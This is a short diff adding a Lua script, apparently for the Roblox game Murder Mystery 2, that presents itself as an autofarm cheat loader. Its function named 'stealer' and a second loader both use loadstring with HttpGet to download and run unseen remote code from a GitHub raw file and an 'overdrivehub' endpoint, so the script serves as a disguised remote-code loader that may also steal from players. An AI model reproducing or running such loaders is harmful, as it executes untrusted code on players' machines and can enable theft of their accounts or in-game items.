@@ -1,1 +1,8 @@
-
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/nobodycodin/Mm2-script/refs/heads/main/mm2-Autofarm'))()
+end
+local function loadui()
+  loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/auth"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
